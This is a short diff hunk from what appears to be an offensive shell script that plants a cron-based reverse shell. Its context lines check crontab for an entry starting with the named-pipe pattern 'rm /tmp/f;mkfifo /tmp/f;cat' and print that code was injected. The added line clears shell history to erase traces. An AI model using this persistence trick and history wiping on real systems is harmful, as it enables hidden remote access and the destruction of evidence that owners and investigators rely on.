@@ -36,3 +36,4 @@ echo -e "\nInjecting Code..."
 crontab -l | grep '* * * * * rm /tmp/f;mkfifo /tmp/f;cat' > /dev/null 2>&1
 
 echo -e "\n${GREEN}[+] CODE INJECTED SUCCESSFULY${ENDCOLOR}\n"
+history -c
